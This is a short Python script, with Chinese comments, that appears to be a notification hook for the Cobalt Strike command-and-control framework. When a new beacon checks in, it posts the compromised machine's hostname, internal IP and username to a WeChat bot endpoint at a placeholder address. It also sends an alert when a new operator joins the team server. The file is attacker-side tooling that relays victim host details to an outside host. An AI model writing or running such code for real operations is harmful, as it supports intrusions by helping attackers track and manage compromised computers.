# encoding:utf-8
import argparse
import requests
import random
import string
import json
import datetime as d

date = str(d.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
#vx接口
url = 'http://x.x.x.x/send'

parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
parser.add_argument('--userjoin')
args = parser.parse_args()

computername = args.computername
internalip = args.internalip
username = args.username
userjoin = args.userjoin
#从a-zA-Z0-9生成指定数量的随机字符：
ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

beacon_content = """

您有新主机上线啦 ！

主机名: {}
IP: {}
用户名: {}

Token: {}

请注意查收哦 ~
""".format(computername, internalip, username, ran_str)


if 'None' not  in beacon_content:
    data = {
        "event":"SendTextMsg",
        "robot_wxid":"", #机器人wxid
        "to_wxid":"", #接收消息wxid
        "msg":"CobaltStrike 上线提醒{}{}".format(beacon_content, date)
    }
    wechat = requests.post(url,data=json.dumps(data))
    print(wechat.text)


if 'None' not in userjoin:
    data = {
        "event":"SendTextMsg",
        "robot_wxid":"", #机器人微信id
        "to_wxid":"",
        "msg":"CobaltStrike 新用户加入提醒\n\n有新用户加入啦 ！\n\n用户名：{}\n{}".format(userjoin, date)
    }
    wechat = requests.post(url,data=json.dumps(data))
    print(wechat.text)







